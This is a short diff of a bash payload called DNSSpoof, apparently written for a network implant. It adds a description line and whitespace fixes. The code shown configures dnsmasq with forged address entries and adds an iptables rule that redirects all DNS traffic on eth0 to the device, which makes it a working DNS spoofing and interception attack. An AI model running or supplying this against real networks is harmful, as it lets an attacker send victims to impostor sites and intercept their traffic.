@@ -1,11 +1,12 @@
 #!/bin/bash
 # 
-# Title:	DNSSpoof
-# Author: 	SebKinne
-# Version:	1.0
-# Category: interception
-# Target: 	Any
-# Net Mode:	NAT
+# Title:		DNSSpoof
+# Description:	Forge replies to arbitrary DNS queries using DNSMasq
+# Author: 		SebKinne
+# Version:		1.0
+# Category: 	interception
+# Target: 		Any
+# Net Mode:		NAT
 
 
 function setup() {
@@ -20,7 +21,7 @@ function setup() {
 	cp $(dirname ${BASH_SOURCE[0]})/spoofhost /tmp/dnsmasq.address &> /dev/null
 
 	# Restart dnsmasq with the new configuration
-	/etc/init.d/dnsmasq restart	
+	/etc/init.d/dnsmasq restart
 }
 
 function run() {
@@ -28,7 +29,7 @@ function run() {
 	LED ATTACK
 
 	# Redirect all DNS traffic to ourselves
-	iptables -A PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53	
+	iptables -A PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53
 }
 
 setup
